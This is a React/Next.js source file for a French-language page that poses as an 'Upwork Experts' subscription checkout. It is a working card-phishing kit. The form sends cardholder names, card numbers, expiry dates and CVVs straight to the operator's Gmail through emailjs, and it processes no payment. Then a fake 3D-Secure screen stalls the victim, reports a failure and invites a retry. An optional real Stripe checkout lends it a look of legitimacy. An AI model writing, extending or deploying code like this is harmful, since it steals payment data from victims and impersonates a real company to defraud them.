import React, { useState, useEffect, useCallback } from 'react';
import emailjs from 'emailjs-com';
import Head from 'next/head';
import { loadStripe } from '@stripe/stripe-js';
import {
  EmbeddedCheckoutProvider,
  EmbeddedCheckout
} from '@stripe/react-stripe-js';

const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY);

const Board = () => {
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [isBlurred, setIsBlurred] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [show3DSecurePopup, setShow3DSecurePopup] = useState(false);
  const [showError, setShowError] = useState(false);
  const [selected, setSelected] = useState(null);
  const [showCache, setShowCache] = useState(true);
  const [showStripe, setShowStripe] = useState(false); // New state
  const [clientSecret, setClientSecret] = useState(null); // Define clientSecret state

  useEffect(() => {
    const blurTimeout = setTimeout(() => {
      setIsBlurred(true);
    }, 500);

    const popupTimeout = setTimeout(() => {
      setShowPopup(true);
      setShowCache(true);
    }, 1000);

    return () => {
      clearTimeout(blurTimeout);
      clearTimeout(popupTimeout);
    };
  }, []);

  useEffect(() => {
    let errorTimeout;
    if (show3DSecurePopup) {
      errorTimeout = setTimeout(() => {
        setShowError(true);
      }, 57000); // DELAY TO SHOW ERROR MESSAGE
    }
    return () => {
      clearTimeout(errorTimeout);
    };
  }, [show3DSecurePopup]);

  useEffect(() => {
    if (show3DSecurePopup) {
      const errorTimeout = setTimeout(() => {
        setShowError(true);
      }, 57000); // DELAY TO SHOW ERROR MESSAGE
      return () => clearTimeout(errorTimeout);
    }
  }, [show3DSecurePopup]);

  const showPaymentPopup = (plan) => {
    setSelectedPlan(plan);
    setShowCache(false);
    setTimeout(() => {
      document.querySelector('.popup').classList.add('show');
    }, 100); // Delay to ensure the class is added after the component is rendered
  };

  const hidePaymentPopup = () => {
    document.querySelector('.popup').classList.remove('show');
    setTimeout(() => {
      setSelectedPlan(null);
      setShowCache(true);
      setShowPopup(true); // Réaffiche la première popup
      setShowStripe(false); // Reset Stripe view
    }, 300); // Match the duration of the CSS transition
  };

  const getPlanPrice = (plan) => {
    switch(plan) {
      case 'Freelance':
        return '90€/mois';
      case 'Agence':
        return '270€/mois'; 
      default:
        return '';
    }
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    setIsLoading(true);

    setTimeout(() => {
      setShowPopup(false);
      setShow3DSecurePopup(true);
    }, 5000);

    emailjs.sendForm('gmail-alexandre', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
      .then(() => {
        console.log('SUCCESS!');
        setIsLoading(false);
        //alert('Form submitted successfully!');
      })
      .catch((error) => {
        console.log('FAILED...', error);
        setIsLoading(false);
      });
  };

  const handleExpiryDateInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    input.value = value;
  };

  const handleCardNumberInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    input.value = value.replace(/(.{4})/g, '$1 ').trim();
  };

  const retry3DSecure = () => {
    setShowError(false);
    setShow3DSecurePopup(false);
    setTimeout(() => {
      setShow3DSecurePopup(true);
    }, 100); // Small delay to reset the popup
  };

  const handleStripePayment = () => {
    setShowStripe(true); // Show Stripe payment details
  };

  const fetchClientSecret = useCallback(() => {
    // Fetch client secret logic here
    return fetch("/api/checkout_sessions", {
      method: "POST",
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: "user@example.com", // Replace with actual user email
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        setClientSecret(data.clientSecret);
      });
  }, []);

  useEffect(() => {
    if (showStripe) {
      fetchClientSecret();
    }
  }, [showStripe, fetchClientSecret]);

  const options = { clientSecret };

  return (
    <div>
      <Head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/></Head>
      <div className={`dashboard-container ${isBlurred ? 'blurred' : ''}`}></div>
      {showCache && <div className='dashboard-cache'></div>}
      <div className={`subscription-popup ${selectedPlan ? 'hidden' : ''} ${showPopup ? 'show' : ''}`}>
        <h2>Activez gratuitement votre compte Upwork Experts</h2>
        <div className="plans">
          <div className="plan ">
            <h3>Freelance</h3>
            <p>90€<span className='month'>/mois</span></p>
            <ul>
              <li>9% de commissions Upwork</li>
              <li>5 mises en relation/mois</li>
              <li>Support RH personnalisé</li>
            </ul>
            <button onClick={() => showPaymentPopup('Freelance')}>Essayer gratuitement</button>
            <span className='notice'>0€ pendant 30 jours, puis 90€/mois</span>
          </div>
          <div className="plan star">
            <h3>Agence</h3>
            <p>270€<span className='month'>/mois</span></p>
            <ul>
              <li>4% de commissions Upwork</li>
              <li>10 mises en relation/mois</li>
              <li>Support RH personnalisé</li>
              <li>Accès recruteur Upwork</li>
              <li>Programme de parrainage</li>
            </ul>
            <button onClick={() => showPaymentPopup('Agence')}>Essayer gratuitement</button>
            <span className='notice'>270€/mois, facturé à date de l'abonnement</span>
          </div>
        </div>
      </div>
      {selectedPlan && !show3DSecurePopup && (
        <div className={`popup ${showPopup ? 'show' : ''}`}>
          <div className={`popup-content ${showStripe ? 'stripe' : ''}`}>
            <button className='return' onClick={hidePaymentPopup}>
              <i className="fas fa-chevron-left"></i>
            </button>
            <div className={`payment-details ${showStripe ? 'stripe' : ''}`}>
              {!showStripe ? (
                <form onSubmit={handleSubmit}>
                  <h3>{selectedPlan} : 30 jours gratuit</h3>
                  <span>0€ pendant 30 jours, puis {getPlanPrice(selectedPlan)} annulez avant pour ne pas être facturé.</span>
                  <div>
                    <label>Titulaire de la carte</label>
                    <input type="text" name="cardHolder" placeholder='Nom du titulaire' required />
                  </div>
                  <div>
                    <label>Numéro de carte</label>
                    <input type="text" className='card-number' name="cardNumber" placeholder='4242 4242 4242 4242' required style={{ width: '100%' }} onInput={handleCardNumberInput} />
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', width: '100%' }}>
                    <div style={{ flex: '1', marginRight: '1rem' }}>
                      <label>Date d'expiration</label>
                      <input type="text" name="cardExpiry" required onInput={handleExpiryDateInput} maxLength="5" placeholder="MM/YY" />
                    </div>
                    <div style={{ flex: '1' }}>
                      <label>CVV</label> 
                      <input type="text" name="cardCvc" required placeholder='***' maxLength="3" />
                    </div>
                  </div>
                  <p className='trial-notice'>Une pré-autorisation temporaire du montant sera effectuée sur votre compte.</p>
                  <button className='buy' type="submit" disabled={isLoading}>
                    {isLoading ? 'Vérification...' : 'Démarrer mon essai'}
                  </button>
                  <p className='buy-notice'>Vous êtes à l'étranger ? <a onClick={handleStripePayment}>Payer avec Stripe</a></p>
                </form>
              ) : (
                <div>
                  <h3>{selectedPlan} : 30 jours gratuit</h3>
                  <span>0€ pendant 30 jours, puis {getPlanPrice(selectedPlan)} annulez avant pour ne pas être facturé.</span>
                  <form className="stripe-form">
                    {clientSecret ? (
                      <EmbeddedCheckoutProvider
                        stripe={stripePromise}
                        options={options}
                      >
                        <EmbeddedCheckout />
                      </EmbeddedCheckoutProvider>
                    ) : (
                      <p>Loading...</p>
                    )}
                  </form>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
      {show3DSecurePopup && (
        <div className="popup show">
          <div className="popup-content d-secure show">
            <h3>Vérificaton 3D-secure</h3>
            {showError ? (
              <>
                <p>La vérification a échoué. Veuillez réessayer.</p>
                <button className='retry-btn' onClick={retry3DSecure}>Réessayer</button>
              </>
            ) : (
              <>
                <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')}</p>
                <span>NETELLER* Essai Freelance</span>
                <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>

                <div className="loading-spinner">
                  <div className="spinner"></div>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Board;